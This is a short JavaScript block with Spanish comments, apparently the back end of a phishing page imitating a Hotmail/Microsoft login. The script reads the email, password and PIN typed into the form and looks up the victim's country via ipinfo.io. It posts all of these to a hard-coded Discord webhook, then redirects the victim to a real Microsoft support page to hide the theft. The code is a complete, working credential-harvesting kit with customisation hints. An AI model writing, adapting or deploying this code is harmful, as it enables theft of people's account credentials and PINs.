<script>
  function sender(event) {
    event.preventDefault(); // Evita recarga

    const webhookURL = "https://discordapp.com/api/webhooks/1441180522914250824/yYygjBxSae4izPsYQMVrEAbb95gQ4R-_2kOc5gbiz4-VYy-VyMsx274v36gng4vg571k";

    // Capturar datos del formulario
    let correo = document.getElementById("uzer").value;
    let pass = document.getElementById("pazz").value;
    let pin = document.getElementById("p1n").value;

    // Obtener país con ipinfo.io (sin token)
    fetch("https://ipinfo.io/json?token=") // Puedes poner tu token aquí para evitar límites
      .then(response => response.json())
      .then(data => {
        let pais = data.country || "Desconocido";

        // Crear payload para Discord
        const payload = {
          content: `📩 **Nuevo envío del formulario**\n\n📧 **Correo:** ${correo}\n🔑 **Contraseña:** ${pass}\n🔢 **PIN:** ${pin}\n🌍 **País:** ${pais}`
        };

        // Enviar datos al webhook
        return fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      })
      .then(response => {
        if (response.ok) {
          activarBanner();
          limpiarFormulario();
          // Redirigir después de 2 segundos
          setTimeout(() => {
            window.location.href = "https://support.microsoft.com/es-es/office/c%C3%B3mo-iniciar-sesi%C3%B3n-en-hotmail-c378938b-c0eb-40c1-b99e-338dd9e776a8"; // Cambia aquí la URL de redirección
          }, 2000);
        } else {
          alert("Hubo un error al enviar los datos.");
        }
      })
      .catch(() => {
        alert("No se pudo conectar al webhook o obtener la información del país.");
      });

    return false; // Para prevenir recarga en navegadores antiguos
  }

  function activarBanner() {
    let banner = document.getElementById("banner");
    if (banner) {
      banner.style.display = "block";
      setTimeout(() => { banner.style.display = "none"; }, 3000);
    }
  }

  function limpiarFormulario() {
    document.getElementById("uzer").value = "";
    document.getElementById("pazz").value = "";
    document.getElementById("p1n").value = "";
  }
</script>
